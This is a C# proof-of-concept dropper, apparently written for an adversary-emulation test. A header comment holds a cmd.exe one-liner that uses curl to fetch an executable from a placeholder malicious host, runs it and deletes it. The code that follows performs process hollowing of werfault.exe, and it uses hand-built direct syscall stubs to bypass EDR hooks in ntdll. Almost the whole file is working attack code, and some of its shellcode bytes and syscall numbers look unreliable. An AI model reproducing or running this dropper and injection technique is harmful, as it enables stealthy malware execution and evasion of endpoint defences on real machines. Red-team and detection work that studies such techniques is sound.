/* 
The Direct Syscall Dropper: Bypassing API Hooks

Command: cmd.exe /c "curl -s #{server.malicious.url}/SyscallHollower.exe -o %TEMP%\SysHollow.exe && %TEMP%\SysHollow.exe && del %TEMP%\SysHollow.exe"

Syscall Stubbing: The program allocates a small region of executable memory (VirtualAlloc) and writes a raw assembly "stub." This stub manually moves a System Service Number (SSN) into the EAX register and triggers the syscall instruction. This replaces the need to call ntdll.dll.
Bypassing Hooks: Since the binary never touches the ntdll.dll code where EDR hooks reside, no "Alert" or "Log" is generated at the API level.
Hollowing werfault.exe: The code targets the Windows Error Reporting process, which is often ignored by baseline security rules as it naturally appears when other things crash.
In-Memory Lifecycle: The binary downloads itself, runs, and deletes itself. Because the "malicious" behavior happens via direct kernel transitions, standard behavioral blocking often misses the event.

*/

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SyscallHollower
{
    class Program
    {
        // --- 🟢 FULL EMBEDDED PAYLOAD (x64 Calc PoC) 🟢 ---
        private static byte[] payload = new byte[] {
            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0,
            0x48, 0x8d, 0x15, 0x07, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x05, 0x00, 0x00, 0x00, 0xff, 0x25,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8d, 0x05, 0x01, 0x00, 0x00, 0x00, 0xc3, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
        };

        // --- Win32 Structures ---
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO { public uint cb; public string lpReserved, lpDesktop, lpTitle; public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }
        
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64 {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] FltSave;
            public ulong LastIP, LastCS, LastDP, LastDS, VectorRegister0, VectorRegister1, VectorRegister2, VectorRegister3, VectorRegister4, VectorRegister5, VectorRegister6, VectorRegister7, VectorRegister8, VectorRegister9, VectorRegister10, VectorRegister11, VectorRegister12, VectorRegister13, VectorRegister14, VectorRegister15, VectorRegister16, VectorRegister17, VectorRegister18, VectorRegister19, VectorRegister20, VectorRegister21, VectorRegister22, VectorRegister23, VectorRegister24, VectorRegister25, VectorRegister26, VectorRegister27, VectorRegister28, VectorRegister29, VectorRegister30, VectorRegister31, VectorControl, DebugControl, LastBranchToRip, LastBranchFromRip, LastExceptionToRip, LastExceptionFromRip;
        }

        // Delegates for Syscalls
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        // Win32 API Imports
        [DllImport("kernel32.dll")] public static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSI, out PROCESS_INFORMATION lpPI);
        [DllImport("kernel32.dll")] public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
        [DllImport("kernel32.dll")] public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
        [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Starting Syscall Hollowing PoC (Targeting werfault.exe)...");

            // 1. Prepare Syscall Stubs
            // Assembly: mov r10, rcx; mov eax, <SSN>; syscall; ret;
            byte[] stub = { 0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

            // Typical System Service Numbers (SSNs) for Windows 10/11 x64
            IntPtr pNtUnmap = CreateSyscallStub(stub, 0x2A); 
            IntPtr pNtWrite = CreateSyscallStub(stub, 0x3A); 

            var ntUnmap = (NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(pNtUnmap, typeof(NtUnmapViewOfSection));
            var ntWrite = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(pNtWrite, typeof(NtWriteVirtualMemory));

            // 2. Spawn Suspended Process
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            string target = "C:\\Windows\\System32\\werfault.exe";

            if (CreateProcess(target, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi))
            {
                Console.WriteLine("[+] Process Created Suspended. PID: " + pi.dwProcessId);

                // 3. Hollow and Write using DIRECT SYSCALLS
                ntUnmap(pi.hProcess, (IntPtr)0x400000);
                IntPtr allocated = VirtualAllocEx(pi.hProcess, (IntPtr)0x400000, (uint)payload.Length, 0x3000, 0x40);
                ntWrite(pi.hProcess, allocated, payload, (uint)payload.Length, out _);

                // 4. Update Context and Resume
                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = 0x100001; // CONTEXT_CONTROL
                GetThreadContext(pi.hThread, ref ctx);
                ctx.Rip = (ulong)allocated;
                SetThreadContext(pi.hThread, ref ctx);
                ResumeThread(pi.hThread);

                Console.WriteLine("[+] Execution Resumed via Syscall Injection.");
            }
        }

        static IntPtr CreateSyscallStub(byte[] stubBase, uint ssn)
        {
            IntPtr pStub = VirtualAlloc(IntPtr.Zero, (uint)stubBase.Length, 0x3000, 0x40);
            byte[] currentStub = (byte[])stubBase.Clone();
            byte[] ssnBytes = BitConverter.GetBytes(ssn);
            Array.Copy(ssnBytes, 0, currentStub, 4, 4);
            Marshal.Copy(currentStub, 0, pStub, currentStub.Length);
            return pStub;
        }
    }
}
